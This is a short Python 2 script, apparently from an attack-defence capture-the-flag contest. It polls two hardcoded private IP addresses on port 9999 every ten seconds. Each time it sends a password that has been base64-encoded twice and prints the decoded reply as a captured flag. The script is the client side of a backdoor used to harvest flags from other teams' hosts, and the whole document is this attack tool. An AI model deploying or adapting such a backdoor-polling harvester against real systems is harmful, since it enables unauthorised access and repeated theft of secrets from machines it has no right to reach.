import socket,base64,time
import threading
port=9999
hosts = ["172.5.70.157", "172.17.4.207"]
def get_flag(target_host,target_port):
    try:
        print "[*] Try to connect%s:%d" % (target_host,target_port)
        client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)            
        client.connect((target_host,target_port))
        passwd='xxxxx'
        client.send( base64.b64encode(base64.b64encode(passwd)))
        response=client.recv(1024)
        print "Get Flag %s" % base64.b64decode(base64.b64decode(response))
        client.close()
    except:
        print "can not connect %s" % target_host
while True:
    time.sleep(10)
    for host in hosts:
        client_handler=threading.Thread(target=get_flag,args=(host,port))
        client_handler.start()
    
